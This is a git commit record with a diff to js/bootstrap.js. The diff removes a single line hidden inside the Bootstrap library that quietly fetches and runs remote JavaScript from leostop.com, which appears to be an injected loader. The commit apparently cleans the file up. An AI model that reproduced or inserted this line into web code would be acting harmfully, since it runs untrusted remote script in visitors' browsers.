e201a84cf7e0320fe63712c6e561fa3a5700fda5
howaboutdat <quydao1462@tamu.edu>
2022-03-02 21:01:25 -0600

    prefinal5

--- js/bootstrap.js
+++ js/bootstrap.js
@@ -2358,7 +2358,6 @@
             return Dropdown;
         })();
 
-    function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
     /**
